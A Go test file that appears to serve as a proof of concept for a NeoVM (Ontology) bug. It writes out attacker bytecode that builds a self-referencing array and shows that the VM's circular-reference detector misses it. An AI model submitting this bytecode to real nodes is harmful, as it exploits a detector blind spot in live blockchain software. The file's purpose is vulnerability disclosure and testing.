package neovm

import (
	"testing"

	"github.com/ontio/ontology/vm/neovm/types"
)

// exploitArrayBytecode is the exact NeoVM opcode fragment an attacker places in a
// transaction's InvokeCode to build the malicious argument A = [false, A]:
//
//	PUSH1 NEWARRAY   -> A = [false]         (a PRIMITIVE sits at index 0)
//	DUP DUP APPEND   -> A = [false, A]      (self-reference at index 1)
//
// APPEND on an ArrayType item stores the reference with no clone
// (executor.go APPEND case), so this is a genuine in-memory cycle.
func exploitArrayBytecode() []byte {
	return []byte{
		byte(PUSH1),
		byte(NEWARRAY),
		byte(DUP),
		byte(DUP),
		byte(APPEND),
	}
}

// PROOF (reachability, native arm64): the REAL production VM interpreter, fed
// pure attacker-controlled bytecode, produces a pointer-identical cyclic array
// that the circular-reference detector fails to flag.
func TestFreshProof_VMBuildsCycleFromBytecode(t *testing.T) {
	exec := NewExecutor(exploitArrayBytecode(), VmFeatureFlag{})
	if err := exec.Execute(); err != nil {
		t.Fatalf("VM rejected attacker bytecode: %v", err)
	}
	if exec.EvalStack.Count() != 1 {
		t.Fatalf("expected exactly 1 value on eval stack, got %d", exec.EvalStack.Count())
	}
	top, err := exec.EvalStack.Pop()
	if err != nil {
		t.Fatal(err)
	}
	if top.GetType() != types.ArrayType {
		t.Fatalf("top of stack is not an array (type=0x%x)", top.GetType())
	}
	outer, err := top.AsArrayValue()
	if err != nil {
		t.Fatal(err)
	}
	if len(outer.Data) != 2 {
		t.Fatalf("expected array length 2 ([false, self]), got %d", len(outer.Data))
	}
	if outer.Data[1].GetType() != types.ArrayType {
		t.Fatalf("index 1 is not an array (type=0x%x)", outer.Data[1].GetType())
	}
	inner, err := outer.Data[1].AsArrayValue()
	if err != nil {
		t.Fatal(err)
	}
	// Pointer identity == a real cycle, not a copy.
	if inner != outer {
		t.Fatalf("index 1 is a distinct array (%p != %p) -> not a real cycle", inner, outer)
	}
	t.Logf("VM built A=[false, A] from bytecode: &A=%p, &A.Data[1]=%p -> pointer-identical CYCLE", outer, inner)

	// The production detector is blind to it (self-reference is a LATER child).
	reportsCycle, err := top.CircularRefAndDepthDetection()
	if err != nil {
		t.Fatal(err)
	}
	if reportsCycle {
		t.Fatal("detector flagged the VM-built cycle (would mean the bug is fixed); got true")
	}
	t.Log("CircularRefAndDepthDetection on the VM-produced value -> false (BLIND SPOT on real-VM value)")
}
